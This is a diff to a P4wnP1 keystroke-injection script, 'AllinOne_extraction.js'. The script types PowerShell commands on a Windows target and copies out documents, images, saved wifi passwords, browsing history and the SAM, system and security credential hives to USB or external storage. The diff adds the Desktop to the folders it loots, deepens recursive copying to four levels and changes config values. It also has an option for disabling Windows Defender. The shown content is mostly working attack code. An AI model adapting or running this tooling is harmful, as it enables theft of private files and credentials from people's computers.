@@ -1,7 +1,7 @@
 /*#########################################################################################################################################\
 # AllinOne_extraction.js                                                                                                                   #
 #   Extraction of folder/file structures, targeted files in specified folders, saved wifi Passwords, browsing history/bookmarks/logs       #
-#   and Windows credential databases (SAM, system and security files) to P4wnP1 mass storage.                                              #
+#   and Windows credential databases (SAM, system and security files) to P4wnP1 mass storage or an external mass storage.                  #
 #                                                                                                                                          #
 #   Author: chriskalv                                                                                                                      #
 #                                                                                                                                          #
@@ -16,18 +16,19 @@
 // GENERAL                                                         // ---
 layout("de");                                                      // Keyboard layout
 typingSpeed(0,0);                                                  // Typing = really fast
-run_as_admin=true;                                                 // Set to true to execute powershell as Administrator
+run_as_admin=false;                                                // Set to true to execute powershell as Administrator
 extract_to_ssd=true;                                               // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
 hide=false;                                                        // Set to true to hide the console window on the target
 exit=true;                                                         // Set to true to exit the console once finished
 modify_defender=false;                                             // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
 var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
-var ssd_drive = "SSD";                                             // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
+var ssd_drive = "exSSD";                                           // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
 // FILES EXTRACTION                                                // ---
 extract_files=true;                                                // Set to true to enable the extraction of files
 extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
 var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
+var user_subfolder3 = ["Desktop"]                                  // The third folder inside the home user directory to be inspected
 var filetypes_user = ["pdf", "jpg", "png"]                         // The filetypes to extract from previously specified folders in the home directory
 var add_folder = "SoftwareXYZ\\subfolder1\\subfolder2"             // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
 var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
@@ -72,8 +73,7 @@ function attack() {
         delay(200);
         press("ENTER");
         delay(200);
-    }
-    else {
+    } else {
         type("\n");
         delay(1000);
     }
@@ -146,27 +146,37 @@ function attack() {
 	delay(4000)
     }
    
-  // Copy files of specified filetypes from specified folders (depth: 3 directories)
+  // Copy files of specified filetypes from specified folders (depth: 4 directories)
     if (extract_files) {
         type("$home_directory = Get-Variable HOME -valueOnly;");
         for (var i = 0; i < filetypes_user.length; i++) {
             type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
             type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
             type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
-            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")   
+            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
+            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
         }  
         for (var i = 0; i < filetypes_user.length; i++) {
             type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
             type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
             type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
-            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n") 
+            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
+            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
+        }
+        for (var i = 0; i < filetypes_user.length; i++) {
+            type("mkdir $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n");
+            type("copy $home_directory\\" + user_subfolder3 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                                 
+            type("copy $home_directory\\" + user_subfolder3 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                              
+            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
+            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
         }
         if (extract_add_folder) {
             for (var i = 0; i < filetypes_addfolder.length; i++) {
                 type("mkdir $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n");
                 type("copy $search_dir\\*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                                 
                 type("copy $search_dir\\*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                              
-                type("copy $search_dir\\*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")                             
+                type("copy $search_dir\\*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")
+                type("copy $search_dir\\*/*/*/*." + filetypes_addfolder[i] + " $lootPathFiles\\add_directory\\" + filetypes_addfolder[i] + ";\n")
             }
         }
     }
